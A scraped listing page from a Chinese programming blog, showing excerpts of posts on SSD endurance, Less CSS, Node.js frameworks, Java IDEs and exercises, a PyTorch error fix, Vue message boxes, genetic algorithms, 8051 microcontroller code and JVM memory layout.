"com.xcj.juhe.mapper.test1", sqlSessionTemplateRef = "test1SqlSessionTemplate") public class DataSource1Config { @Bean(name = "test1DataSource") @ConfigurationProperties(prefix = "spring.datasource.test1") @Primary public DataSource testDataSource() { return DataSourceBuilder.create().build(); } @Bean(name = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4cb38042a11fc11dff976af3ed3cc4bc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/29fcc18f2eadb53a8c3ad0e57a7256f0/" rel="bookmark">
			企业级SSD 寿命要怎么看？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		从SLC、MLC，到今天的TLC乃至QLC，技术的迭代使得NAND存储密度越来越高，每GB的拥有成本也越来越低。如今，几TB甚至十几TB的企业级NVMe SSD已经开始成为主流，但另一方面，NAND的Cell擦写寿命越来越短，也引发了对于SSD寿命的诸多讨论。
什么是SSD的寿命？ 通常说的SSD寿命是指在SSD生命周期内允许的数据写入量。增大SSD的用户容量、选择更高可擦写次数的NAND颗粒，无疑都是延长SSD寿命的有效手段。同时，它还要求SSD的其它硬件、软件（固件）都不存在短板。
一块企业级SSD在其整个生命周期中，应当在各类复杂的负载及外界环境下，都能保证其关键指标的一致。它要求产品在设计时，就充分考虑复杂多样的用户使用场景，并在功能设计、电路设计、元器件选型、固件算法等方方面面均满足预定的寿命和可靠性指标。NAND寿命虽然是影响SSD寿命的因素之一，但二者并不等同。
为何NAND寿命如此受关注？ 不论是SLC、MLC，还是TLC，它们都利用了量子力学的隧道效应，在控制门上加较高的编程电压，使电子穿越隧道氧化层到达浮栅，并聚集在浮栅上，存储信息。擦除时仍利用隧道效应，将电压反转，从而消除浮栅上的电子，达到清除信息的结果。电子在反复来回穿越的过程中会对隧道氧化层造成不可逆的磨损，使其不能再有效保持浮栅门中的电荷，并最终失效。
NAND寿命的量化指标为P/E Cycles，也就是写入/擦除（Program / Erase）次数，一写一擦就会消耗NAND的1个P/E。根据NAND厂商的要求，在P/E耗尽之前，NAND应满足以下特征：
NAND在正常工作温度下仍能保持要求的RBER（原始比特错误率）NAND剩余的好块个数可继续满足其参数规格对温度的敏感度仍可满足使用要求数据Read Disturb的抵抗能力仍满足要求原定的读写擦各项性能参数仍能满足要求…… SLC NAND的P/E次数可达100000，MLC约为3000，主流的消费级TLC NAND大约在500 ~ 1000，而企业级eTLC则高得多，一般为5000 ~ 10000。假设SSD的用户容量并没有几何级的增加，NAND的可用P/E次数少了，用户对SSD整盘寿命的担心自然会增加。
加剧NAND损耗的原因 假如，我的SSD是1TB可用容量，P/E次数为1000，是否意味着，当我写完第1000TB数据的时候，SSD才会寿终？很遗憾，事实并非如此，甚至比你想的更加糟糕。写放大是导致这一问题的根本。
根据NAND工作原理，它以Page（页）为单位写入数据，以Block（块）为单位进行擦除，在新数据写入时，需要先对写入位置进行擦除操作，而不是像HDD那样可以直接覆盖。由于一个Block中含有多个Page，因此在擦除时需要先对里面的有效数据进行保留，重新写入，引发GC（Garbage Collection，垃圾回收）和写放大（WA，Write Amplification）。即，用户写1笔数据，真正写入到SSD中的可能是2~3笔，这样无疑会加剧NAND的P/E消耗。
企业应用的工作负载千差万别，不同工作负载所触发的写放大并不一样。在对硬盘的写入寿命测试中，我们通常会用到三种典型的负载模型：顺序、纯4K随机和JESD219中定义的IO模型，并引入WAF（写放大因子）的概念。
如上所示，顺序写入的WAF最小，约等于1（实际写入量约等于用户写入量），但由于现实业务场景很少有纯顺序工作负载，其测出的写入寿命并不具备实际可执行性；4K随机看似合理，但由于不含小于4K的IO操作，和用户实际场景也有一定差别；JESD219则对企业级用户的实际业务情况进行了参考和模拟，为SSD写入负载测试带来了行业参考标准，它包含从512 bytes到64K不同权重IO分布的组合，这些小于4K的IO也会进一步带来写放大。
此外，JESD219还根据企业级IO模型特点，对冷热数据进行了定义，借此触发磨损均衡（Wear-leveling），引入额外数据搬移，这也是JESD219标准下SSD的写放大会比纯 4K随机负载更高的原因。
不同测试方法导致不同的SSD寿命预估结果，WAF越高，其结果越具参考性。例如，市面上常见的企业级SSD，在纯顺序工作负载下的DWPD（硬盘生命周期内，全盘每天可写入的次数）可以达到5，在JESD219定义负载下，DWPD可能只有1。
以Memblaze PBlaze6 6920系列企业级SSD为例，其5年DWPD和PBW寿命是在JESD219工作负载下测试得出的。这样的测试标准显然更符合企业用户的实际使用场景，更具参考意义。
P/E Cycles可以被提升吗？ 对于增加NAND的P/E可擦写次数，目前并没有好的办法，只能通过一些技术手段，让NAND在P/E耗尽之前，尽可能表现可靠。
NAND原厂对于数据纠错，会提供Retry Table，通过改变读数据的参考电压等各种参数供用户（SSD模组厂）使用。而对于那些合作足够紧密的厂商，甚至可以得到内部命令，进一步微调每一个波谷的位置，从而实现更强的数据纠错能力。
NAND的老化不以外界意志为转移，P/E Cycles，顾名思义只和Program &amp; Erase动作相关，以优化读取电压为手段的提升P/E次数更是站不住脚。原厂每代NAND产品都经过了长时间的验证，得出了合适的参数固化成NAND产品投入市场。SSD厂商可以在所有与写放大的相关算法、技术中做出优化，但终不能突破P/E Cycles的最大数值。
当P/E Cycles达到厂商承诺的顶点时，SSD寿终。此时，你可能仍然可以对SSD进行读取、写入操作，但其中某个你注意不到的指标很可能已经发生“器官衰竭”，最明显的表现就是数据保持能力急剧下降，出现数据错误率上升、数据损坏甚至丢失等问题，这样的隐患仅通过读写测试很难得到。此时SSD已不具备可靠特性，不建议继续使用。
SSD寿命怎么看？PBW和DWPD SSD寿命单位有两种，PBW（或TBW）和 DWPD：
PBW（或TBW）：全称Petabytes Written（或Terabytes Written），在SSD的生命周期内允许的主机端数据写入量。1PBW = 1000TBWDWPD：全称Drive Writes Per Day，在SSD的生命周期内，每天允许全盘写入的次数。 DWPD和PBW/TBW可以相互换算，公式如下：
假设一款SSD的用户容量为3.2TB，5年DWPD为3.4，那么其TBW为3.2TB×3.4×365×5，即19856TB。
DWPD的计算和硬盘服役时间有关，对企业级SSD来说，一般以5年产品保修期为参考。以PBlaze5 926系列企业级SSD为例，其每天3.4 DWPD写入量对应为5年生命周期，如果这块SSD只需要服役3年，那么其每天的DWPD可以达到5.7。
SSD的寿命和MTBF的关系？ 寿命代表SSD可以用多久，MTBF（Mean Time between Failures，平均故障间隔时间）则代表了寿命期间，这块SSD是否可靠。上文《揭秘：SSD的“可靠性”到底可不可靠》提到，在SSD生命周期内，其可靠性表现应始终满足行业标准（如企业级SSD需保证用户容量不变，UBER ≤ 10E-16，FFR≤ 3%，断电后40℃的室温下数据可以保持3个月）；当SSD寿命耗尽，即达到预定的最大P/E次数，其可靠性会出现大幅下降。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/29fcc18f2eadb53a8c3ad0e57a7256f0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2e5db409a7e4a356a544e6ca359f5446/" rel="bookmark">
			关于Less的学习小结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		关于Less的学习小结 Less是什么？ Less是一个CSS预处理器，文件后缀是.less相当于一个中间工具，人使用less语法写相关的样式代码，less插件（Easy Less）将其翻译为浏览器可以识别的css代码less插件是把less格式文件转换为css文件（浏览器不能直接识别less） 为什么学less？ Less扩充了CSS语言，使CSS具备一定的逻辑能力，计算能力直观理解：为什么使用md语法记笔记而不使用word逻辑能力如父类样式中可以直接嵌套子类样式，以及可以使用变量存储值计算能力：移动端适配时经常使用，属性值可以使用表达式 怎么用Less？ 需要在编辑器中安装相关插件；如vscode中的Easy Less Less基础语法 注释 单行注释： // 注释行快捷键 CTRL + /
块级注释 ：与css注释语法相同，为/* */快捷键 shift + alt +A
// 单行注释 /* 多行注释 与css注释方式相同 单行注释在转换css文件时也变成了此种注释方式 单行注释和js注释方式一样 */ 运算 运算加、减、乘正常使用即可 ：需要注意的是除法运算： 需要使用小括号或者 " ./ " //2*100px //12+1px //12-1px width:(48 / 37.5rem); width:48 ./ 37.5rem; // ./方式在vscode中会出现波浪线警告，但可以正常使用 嵌套 嵌套，类似div盒子一样，不仅可以写自己的样式代码，还可以选中其子代进行样式代码书写其中"&amp;"代表本身选择器，一般与伪类、伪元素连用 .father{ width:100%; height:(150 / 37.5rem); .son{ height:80 ./ 37.5rem; &amp;：hover{ color:red; } } &amp;::after{ content:""; display：block; ... } } 变量 定义方法：@变量名 ：值；使用方法：css属性：@变量名；注意使用时也需要加@ @fontsizeRoot:37.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2e5db409a7e4a356a544e6ca359f5446/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d2c5dcb49747fb8b8acea52b84da1383/" rel="bookmark">
			带你理清Node.js 的Web框架的3个层次
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		web 框架指的是处理 http、https 的服务端框架，Node.js 提供了 http、https 模块用于处理协议数据，这是 web 框架的基础。
但是 http、https 的 api 过于简单，用起来比较麻烦，所以一般会用 express、koa、fastify 这种封装了一层的框架来简化。
但 express 类的框架不提供代码架构方面的限制，所以对于模块比较多比较复杂的企业级应用来说并不适合，这时就要用实现了 MVC 的 eggjs、nestjs 这类企业级 web 框架。
这是 web 框架的 3 个层次，理清了它们的关系和适用场景，再去学习才不会迷茫。
下面我们分别来看一下：
http、https
http 是基于 TCP 的，对 TCP 传过来的 http 协议数据做 parse，传给 handler 处理，handler 处理完要返回 http 响应，这是 http 模块做的事情。
const http = require('http'); const server = http.createServer((req, res) =&gt; { res.writeHead(200, { 'Content-Type': 'text/plain' }); res.end('okay'); }); server.listen(8080, '127.0.0.1'); http 模块虽然能处理请求和响应，但是提供的 api 过于原始：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d2c5dcb49747fb8b8acea52b84da1383/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ae91888e4d3800eb78f8db01a2383ab8/" rel="bookmark">
			MacPro微信可以使用，其他应用均不能联网，浏览器网页也打不开
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		MacPro微信可以使用，其他应用均不能联网，浏览器网页也打不开 问题描述解决办法 问题描述 1.MacPro已连接WiFi，WiFi可用；
2.微信可正常使用，其他应用如Safari、芒果TV/腾讯视频等均无法联网；
3.重启两次以上还是不行；
4.删掉“系统偏好设置——网络——WiFi”之后重建，也还是之前那个屎样；
5.MacPro此时还没被砸坏。
😈😈😈
解决办法 DNS!!!DNS!!!DNS!!!DNS!!!DNS!!!DNS!!!DNS!!!DNS!!!DNS!!!
流程走一遍：系统偏好设置——网络——WiFi——高级——DNS——DNS服务器，此时查看一下你的DNS服务器地址：
1.如果是8.8.8.8，删掉换成114.114.114.114，点击“好-&gt;应用”；
2.如果是114.114.114.114，删掉换成8.8.8.8，点击“好-&gt;应用”。
注意：DNS地址只保留一个！
此时，如果你后台开着音乐和视频等待播放，那将如同便秘后的一泻千里😬，祝您通畅！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f81286e38dac50136c0c6133da457532/" rel="bookmark">
			NetBeans、Eclipse和IntelliJ，哪个才是最优秀的Java IDE?
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		众所周知，集成开发环境(IDE)能够让程序员的日常编程过程，比起直接在文本编辑器上编写代码要容易得多。它不但可以及时推送各种代码建议，并且能够高亮地显示代码中的各种错误，最终让程序员交付出高质量的程序。
而作为具有出色的开发能力的编程语言，Java已经被业界广为接受与使用。目前，我们可以轻松地获取到各种优秀的、基于Java的IDE，其中不乏NetBeans、Eclipse和IntelliJ。那么我们该如何在实际开发中进行选择呢?下面让我们一起来深入了解。
NetBeans NetBeans拥有庞大的Java开发人员用户群，其中包括面向企业、嵌入式系统、Web、移动、桌面应用等领域的专业开发人员。目前，Oracle已将NetBeans作为其Java 8及更高版本的官方IDE。
1996年，NetBeans源于捷克的一个学生项目，其最初版是在2014年被发布的。由于免费且开源，因此它非常适合学生和初学者。您可以在该开发平台上找到所有主流框架的插件。其出色的功能，可被用于不同的环境与应用目的。
NetBeans是完全使用Java编写的，可以支持Windows、Mac、Oracle、Solaris和 Linux系统。该开发平台为端到端的软件开发生命周期，提供了需求分析，应用程序设计、开发、调试、分析和测试等一条龙的服务。程序员们可以在NetBeans上，高效地编译、运行和部署各类应用。
特征 Smart Reader：大多数IDE的纠错功能往往令人无比困惑，但是NetBeans的Smart Reader功能则不然。该功能会自动检测代码中的错误，并推送各种有益于调试的建议。此外，NetBeans还配备了一个适合各种硬件的轻量级文本编辑器。内置的MAVEN支持：NetBeans非常适合那些希望在项目中，使用到MAVEN的开发人员。由于该开发环境自带有针对MAVEN的内置支持，因此您不必从其他的来源手动导入MAVEN。支持最新的Java技术：NetBeans的强大之处在于其精心设计的功能集。它通过支持Java的所有高级特性和方法，大幅简化了平台上的开发。同时，NetBeans还自带有代码编辑器、分析器和代码转换器等多种工具。支持多种语言：虽然NetBeans主要专注于Java的开发，但是您完全可以将其用于其他的编程语言中。该平台既可以支持JSP、JavaScript、HTML、以及XML等客户端语言，又能够为服务器端提供C、C++和PHP。易于使用：NetBeans不仅带有友好的用户界面，而且具有较强的环境适应能力，这对于新手编程人员十分重要。同时，NetBeans拥有响应迅速的社区支持，您可以随时查看到自己的问题，是否已在线上论坛被讨论过。 NetBeans的限制 内存使用：虽然NetBeans带有一个轻量级的代码编辑器，但是如果您运行的是某个复杂的程序，那么该平台仍然会成为内存使用的大户。传统的系统优化方式对于基于Java的IDE效果并不明显，因此，我们需要对其进行人工改进。有限的官方支持：通常，我们在互联网上很难找到丰富的、来自NetBeans的官方文档。因此，您需要求助于在线社区，以解决碰到的问题。当然，鉴于其庞大的用户群，社区内解决问题地效率还是比较高的。 Eclipse IDE IBM于2001年末开发并发布了Eclipse。它能够提供的插件数量远超其他IDE。Eclipse通过自带的多种插件和特性函数，来加快程序的开发速度。其中，Junit、testing、MAVEN、Spring Framework和Subversion都有Eclipse对应的插件。
特征 代码洞见：程序员在Eclipse上编写程序时，能够通过便捷的代码洞见发现错误，获取相关的代码建议，并最终加快编程的整个过程。具体而言，您只要通过按下Tab键，对应的代码建议就会浮现出来。据此，您不必重复输入代码的冗余部分。高级工具：作为一款基于Java的IDE，Eclipse提供Docker等丰富出色的功能函数。据此，您可以有效地组织自己的软件包栈。同时，Eclipse也支持通过Git，来跟踪您的各种现有文件。支持多种语言：虽然Eclipse主要被用于Java开发，但是它也支持诸如C、C++、PHP、HTML等其他的语言。您可以在Eclipse中找到与这些编程语言相关的插件，进而提高编程过程的整体效率。 Eclipse的缺点 在每次安装插件时，Eclipse都需要重新启动。因此，当您的项目需要大量插件时，这可能会给整体项目带来不必要的麻烦。Eclipse在运行较大的程序时，会消耗异常高的内存。该IDE虽然以运行速度而闻名，但是有时却比某些轻量级IDE运行程序更耗时间。 IntelliJ IDEA 作为一款基于Java的顶级IDE，IntelliJ往往被大型企业所使用。其开发环境能够提供诸如：智能源代码索引、可靠的重构、以及动态代码分析等，独特的企业级功能函数。
目前，该IDE有两种变体，分别是：免费的社区版和高级的终极版。其中，高级版本是为适应企业级需求而量身定制的。
特征 分析数据流：当您输入代码时，IntelliJ会智能地为您创建一个符号列表，以便您通过按下Enter键调用已输入过的代码。据此，您可以大幅缩短程序开发的周期。导航到重复项：此功能会帮助您发现程序中的冗余，并以下划线的形式标注出来。例如，它会提示您已经两次声明了同一个变量。据此，您无需去手动查找各种冗余。快速修复：当您在勘查代码中的出错时，IntelliJ会显示为一个灯泡形的符号。而当您按下此类灯泡形图标时，该IDE环境会自动为您修复错误。版本控制：IntelliJ可以通过扩展其对于GitHub的支持，来协助跟踪项目。该功能对于使用GitHub开源项目的开发人员来说，非常实用。 IntelliJ的缺点 在更复杂的项目中，IntelliJ往往需要花费时间去索引目标代码。而在您的代码完成了全面索引之前，您将无法使用其大部分功能函数。IntelliJ虽然以其丰富的插件见长，但是它也默认保留了许多不必要的插件。由于IntelliJ为Java开发提供了功能极其丰富的IDE，因此它必然也是内存消耗的大户。其最低的系统要求是上述两种IDE的四倍。 三者的比较 虽然上面介绍的三种Java IDE都能够凭借着便捷的功能，提高开发人员的开发效率，但是三者也各有独到之处。NetBeans以其友好的UI和出色的支持，成为了初学者的入门级IDE。而作为一种多功能的IDE，Eclipse可以完美地满足初学者和企业级用户的需求。IntelliJ则能够为企业用户提供一套完备的开发功能集。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b26d1d891fe55d6f0baea0406972cb94/" rel="bookmark">
			简单代码训练（if语句）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.（if 语句）读入一个整数，判断其是奇数还是偶数：
package com.xiaobaiExercise; //导包 import java.util.Scanner; //判断奇偶数 public class OddNumber { public static void main(String[] args) { int a; System.out.println("请输入一个自然数："); //输入数字 Scanner x = new Scanner(System.in); a = x.nextInt(); if (a &lt; 0) { System.out.println("请输入一个自然数！！"); } else if (a % 2 == 0) { System.out.println("这个数字为偶数"); } else { System.out.println("这个数字为奇数"); } } } 测试运行结果：
请输入一个自然数：
110
这个数字为偶数
2.（switch 语句）读入一个整数，如果是1~5 之间，则分别输出5 个福娃的名字，否则输出“北京欢迎你”。 package com.xiaobaiExercise; import java.util.Scanner; public class FuWa { public static void main(String[] agr) { int a; System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b26d1d891fe55d6f0baea0406972cb94/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d85dc07deec4f155e573ad2c9023ecdd/" rel="bookmark">
			PyTorch报错：RuntimeError: CUDA error: device-side assert triggered at /pytorch/aten/src/THC/generic
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		报错显示：
RuntimeError: cuda runtime error (710) : device-side assert triggered at C:/cb/pytorch_1000000000000/work/aten/src\THC/generic/THCTensorMath.cu:29 用gpu运行不能显示出真正的错误原因，把模型和数据放在cpu上运行显示：
return torch._C._nn.cross_entropy_loss(input, target, weight, _Reduction.get_enum(reduction), ignore_index) IndexError: Target 61 is out of bounds. 这是由于类索引不在 的预期标签范围内[0, n_classes-1]，
使用 torch.nn.CrossEntropyLoss () 它默认输入的标签范围是[0, n_classes-1] ，如果标签出现负数或者超出这个范围就会报错。将标签修改即可解决这个问题。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5e1998b484b8ce4b72b14dc7be367ab8/" rel="bookmark">
			vue解决elementui消息弹出框ElMessageBox动态内容换行问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1. 实现效果 2.解决方法: 使用模板字符串 + br 标签换行 + dangerouslyUseHTMLString 属性 2.1 JS处理
const deleteBusArea = () =&gt; { ElMessageBox({ title: '提示', message: `${busArea.deleName}有${busArea.deleSonNumber}个下属区域，删除后其下区域将一并删除&lt;br/&gt;${busArea.deleName}或其下属区域下存在督导/拓展，删除此区域后，督导/拓展对应的区域请及时维护`, dangerouslyUseHTMLString: true, showCancelButton: true, confirmButtonText: '确认', cancelButtonText: '取消' }).then(() =&gt; { api.businessArea.deleteCodeUp({ code: busArea.deleCode }).then(res =&gt; { }) }) } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e2f4da7472baf88b4934c62310542f0b/" rel="bookmark">
			遗传算法入门
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		遗传算法入门 2 遗传算法2.1 理论引入2.1.1 基因和染色体1) 概述2) 相关问题 2.1.2 袋鼠跳问题1) 爬山法（最速上升爬山法）2) 模拟退火3) 遗传算法： 2.1.3 遗传算法概述1) 概述2) 一般步骤 2.2 算法细节2.2.1 基因编码1) 二进制编码2) 浮点数编码3) 模型抽取 2.1.2 适应度评分与选择 物竞天择1) 物竞 - 适应度函数（fitness function）2) 天择 - 选择函数（selection）轮盘赌（Roulette Wheel Selection）选择法锦标赛选择算法 2.1.3 基因重组/交叉(recombination/crossover)2.1.4 基因突变/变异(Mutation)2.1.5 复制2.1.6 算法流程 2 遗传算法 2.1 理论引入 2.1.1 基因和染色体 1) 概述 ​ 遗传算法中每一条染色体，对应着遗传算法的一个解决方案，一般我们用适应性函数（fitness function）来衡量这个解决方案的优劣。所以从一个基因组到其解的适应度形成一个映射。可以把遗传算法的过程看作是一个在多元函数里面求最优解的过程。 可以这样想象，这个多维曲面里面有数不清的“山峰”，而这些山峰所对应的就是局部最优解。而其中也会有一个“山峰”的海拔最高的，那么这个就是全局最优解。而遗传算法的任务就是尽量爬到最高峰，而不是陷落在一些小山峰。（另外，值得注意的是遗传算法不一定要找“最高的山峰”，如果问题的适应度评价越小越好的话，那么全局最优解就是函数的最小值，对应的，遗传算法所要找的就是“最深的谷底”）
2) 相关问题 ​ 我们可以看下述这样的简单问题, 对于一元函数 f ( x ) = x sin ⁡ ( 10 π x ) + 2 x ∈ [ − 1 , 2 ] f(x)=x\sin(10\pi x)+2 \ \ \ \ x \in [-1,2] f(x)=xsin(10πx)+2 x∈[−1,2] 要求在给定的区间找到函数最大值:
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e2f4da7472baf88b4934c62310542f0b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/58941bf9d2f7ee3d07bf3566dbbc7a34/" rel="bookmark">
			单片机按键控制数字加减
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		软件使用：keil，proteus
程序：
#include &lt;reg51.h&gt;
#define u8 unsigned char
#define u16 unsigned int
#define SMG_XS P2 #define SMG_XM P0
unsigned char code smg[]={0xc0,0xf9,0xa4,0xb0,0x99,0x92,0x82,0xf8,0x80,0x90};//共阳极
%使用的数码管为共阳的
unsigned int shuzi;
sbit s1=P1^0;
sbit s2=P1^3;
void delay(u16 i)
{
while(i--); }
void main()
{
shuzi=99;
while(1)
{
SMG_XS=smg[shuzi%10]; //取余
SMG_XM=smg[shuzi/10];
if(s1==0){ //加
delay(500);
if(s1==0){
shuzi++;
if(shuzi&gt;99){
shuzi=0;
} }
while(!s1);
} if(s2==0){ //减
delay(500);
if(s2==0){
shuzi--;
}
while(!s2);
}
}
}
proteus作图：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1f6d1d244030e8408e2d42245dc80d81/" rel="bookmark">
			深入理解Java虚拟机之JVM内存布局篇
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		内存布局 JVM内存布局规定了Java在运行过程中内存申请、分配、管理的策略，保证了JVM的稳定高效运行。不同的JVM对于内存的划分方式和管理机制存在部分差异。结合JVM虚拟机规范，一起来探讨jVM的内存布局。如下图所示：
Heap 堆区 ​ Heap堆区是Java发生OOM（Out Of Memory）故障的地方，堆中存储着我们平时创建的实例对象，最终这些不再使用的对象会被垃圾收集器回收掉，而且堆是线程共享的。一般情况下，堆所占用的内存空间是JVM内存区域中最大的，我们在平时编码中，创建对象如果不加以克制，内存空间也会被耗尽。堆的内存空间是可以自定义大小的，同时也支持在运行时动态修改，通过 -Xms 、-Xmx 这两参数去改变堆的初始值和最大值。-X指的是JVM运行参数，ms 是memory start的简称，代表的是最小堆容量，mx是memory max的简称，代表的是最大堆容量；如 -Xms256M代表堆的初始值是256M，-Xmx1024M代表堆的最大值是1024M。由于堆的内存空间是可以动态调整的，所以在服务器运行的时候，请求流量的不确定性可能会导致我们堆的内存空间不断调整，会增加服务器的压力，所以我们一般都会将JVM的Xms和Xmx的值设置成一样，同样也为了避免在GC（垃圾回收）之后调整堆大小时带来的额外压力。
​ 堆区分为两大区：Young区和Old区，又称新生代和老年代。对象刚创建的时候，会被创建在新生代，到一定阶段之后会移送至老年代，如果创建了一个新生代无法容纳的新对象，那么这个新对象也可以创建到老年代。如上图所示。新生代分为1个Eden区和2个S区，S代表Survivor。大部分的对象会在Eden区中生成，当Eden区没有足够的空间容纳新对象时，会触发Young Garbage Collection，即YGC。在Eden区进行垃圾清除时，它的策略是会把没有引用的对象直接给回收掉，还有引用的对象会被移送到Survivor区。Survivor区有S0和S1两个内存空间，每次进行YGC的时候，会将存活的对象复制到未使用的那块内存空间，然后将当前正在使用的空间完全清除掉，再交换两个空间的使用状况。如果YGC要移送的对象Survivor区无法容纳，那么就会将该对象直接移交给老年代。上面说了，到一定阶段的对象会移送到老年区，这是什么意思呢？每一个对象都有一个计数器，当每次进行YGC的时候，都会 +1。通过-XX:MAXTenuringThrehold参数可以配置当计数器的值到达某个阈值时，对象就会从新生代移送至老年代。该参数的默认值为15，也就是说对象在Survivor区中的S0和S1内存空间交换的次数累加到15次之后，就会移送至老年代。如果参数配置为1，那么创建的对象就会直接移送至老年代。具体的对象分配即回收流程可观看下图所示。
如果Survivor区无法放下，或者创建了一个超大新对象，Eden和Old区都无法存放，就会触发Full Garbage Collection，即FGG，便再尝试放在Old区，如果还是容纳不了，就会抛出OOM异常。在不同的JVM实现及不同的回收机制中，堆内存的划分方式是不一样的。
Metaspace 元空间 ​ 在JDK8版本中，元空间的前身Pern区已经被淘汰。在JDK7及之前的版本中，Hotspot还有Pern区，翻译为永久代，在启动时就已经确定了大小，难以进行调优，并且只有FGC时会移动类元信息。不同于之前版本的Pern（永久代），JDK8的元空间已经在本地内存中进行分配，并且，Pern区中的所有内容中字符串常量移至堆内存，其他内容也包括了类元信息、字段、静态属性、方法、常量等等都移至元空间内。
JVM Stacks 虚拟机栈 ​ 栈（Stack）是一个先进后出的数据结构，先进后出怎么理解？类似于我们平时打羽毛球时，装羽毛球的球筒，第一个先放进去的往往最后一个才能拿出来，最后放进去的一个最先拿出来。
​ 相对于基于寄存器的运行环境来说，JVM是基于栈结构的运行环境。因为栈结构移植性更好，可控性更强。JVM的虚拟机栈是描述Java方法执行的内存区域，并且是线程私有的。栈中的元素用于支持虚拟机进行方法调用，每个方法从开始调用到执行完成的过程，就是栈帧从入帧到出帧的过程。在活动线程中，只有位于栈顶的帧才是有效的，称为当前栈帧。正在执行的方法称为当前方法，栈帧是方法运行的基本结构。在执行引擎运行时，所有指令都只能针对当前栈帧进行操作。而StackOverflowError表示请求的栈溢出，导致内存耗尽，通常出现在递归方法中。如果把JVM当做一个棋盘，虚拟机栈就是棋盘上的将/帅，当前方法的栈帧就是棋子能走的区域，而操作栈就是每一个棋子。操作栈的压栈和出栈如下图所示：
​ 虚拟机栈通过压栈和出栈的方式，对每个方法对应的活动栈帧进行运算处理，方法正常执行结束，肯定会跳转到另外一个栈帧上。在执行的过程中，如果出现异常，会进行异常回溯，返回地址通过异常处理表确定。栈帧在整个JVM体系中的地位颇高，包括局部变量表、操作栈、动态连接、方法返回地址等。
​ 下面对栈帧的各个活动栈帧进行简要的分析
​ （1）局部变量表
​ 局部变量表是存放方法参数和局部变量的区域。我们都知道，类属性变量一共要经历两个阶段，分为准备阶段和初始化阶段，而局部变量是没有准备阶段，只有初始化阶段，而且必须是显示的。如果是非静态方法，则在index[0]位置上存储的是方法所属对象的实例引用，随后存储的是参数和局部变量。字节码指令中的STORE指令就是将操作栈中计算完成的局部变量写回局部变量表的存储空间内。
​ （2）操作栈
​ 操作栈是一个初始状态为空的桶式结构栈。在方法执行过程中，会有各种指令往栈中写入和提取信息。JVM的执行引擎是基于栈的执行引擎，其中的栈指的就是操作栈。字节码指令集的定义都是基于栈类型的，栈的深度在方法元信息的stack属性中，下面就通过一个例子来说明下操作栈与局部变量表的交互：
public int add() { int x = 10; int y = 20; int z = x + y; return z; } 字节码操作顺序如下：
public int add(); Code: 0: bipush 10	//	常量 10 压入操作栈 2: istore_1	//	并保存到局部变量表的 slot_1 中 （第 1 处） 3: bipush 20	//	常量 20 压入操作栈 5: istore_2	//	并保存到局部变量表的 slot_2 中 6: iload_1	//	把局部变量表的 slot_1 元素（int x）压入操作栈 7: iload_2	//	把局部变量表的 slot_2 元素（int y）压入操作栈 8: iadd	//	把上方的两个数都取出来，在 CPU 里加一下，并压回操作栈的栈顶 9: istore_3	//	把栈顶的结果存储到局部变量表的 slot_3 中 10: iload_3 11: ireturn	//	返回栈顶元素值 ​ 第 1 处说明：局部变量表就像一个快递柜，有着很多的柜子，依次编号为1,2,3，.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1f6d1d244030e8408e2d42245dc80d81/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/49fe0a1bf50fd284512da0e04c114948/" rel="bookmark">
			论文浅尝 | 异构图 Transformer
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		笔记整理：许泽众，浙江大学博士在读
论文链接：https://arxiv.org/abs/2003.01332
本文主要提出一种处理异构图的方法，所谓异构图（Heterogeneous graph）是指在一个图中会出现不同类型的边和节点的图。早期对于图的处理图的方法一般集中于同构图的处理。近年来开始关注对异构图的处理，但是一般都具有以下缺点：
